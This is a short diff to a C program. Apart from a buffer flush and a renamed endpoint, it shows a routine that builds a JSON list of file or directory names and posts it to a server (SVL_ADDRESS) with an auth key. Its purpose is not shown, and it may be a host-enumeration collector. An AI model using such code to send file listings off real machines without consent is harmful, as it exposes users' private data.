@@ -144,6 +144,8 @@ void print_mem(char* str, int size, boolean show_null)
         }
     }
 
+    // Stdout is buffered
+    fflush(stdout);
     puts("");
 }
 
@@ -214,7 +216,6 @@ char* spill_file_json(char** file_names, int size, int* json_length)
 
     // Close the JSON at the end - and overwrite the last comma with }. The null byte can stay intact - no need to copy that over.
     concat_mem(&json_string, (json_size - 1) - 1, "}", 1, &json_size);
-
     *json_length = json_size;
     return json_string;
 }
@@ -229,7 +230,7 @@ int main()
     // print_mem(json_str, json_length, TRUE);
 
     // Send it to the server
-    send_post_request(SVL_ADDRESS, json_str, json_length, "enumerate", SVL_AUTHKEY);
+    send_post_request(SVL_ADDRESS, json_str, json_length, "enumerator", SVL_AUTHKEY);
 
     dealloc_str_arr(dir_names, size);
     free(json_str);
